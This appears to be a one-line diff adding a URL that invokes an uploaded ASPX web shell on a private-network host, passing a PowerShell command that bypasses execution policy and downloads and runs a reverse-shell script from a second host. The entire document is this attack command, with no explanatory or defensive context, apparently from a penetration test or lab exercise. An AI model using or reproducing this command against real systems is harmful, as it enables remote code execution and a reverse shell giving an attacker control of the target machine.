@@ -1,0 +1,1 @@
+http://10.2.10.22/upload/shell.aspx?cmd=powershell.exe%20-exec%20Bypass%20-noexit%20-C%20%22IEX%20(New-Object%20Net.WebClient).DownloadString(%27http://10.2.10.191/revshell.ps1%27)%22
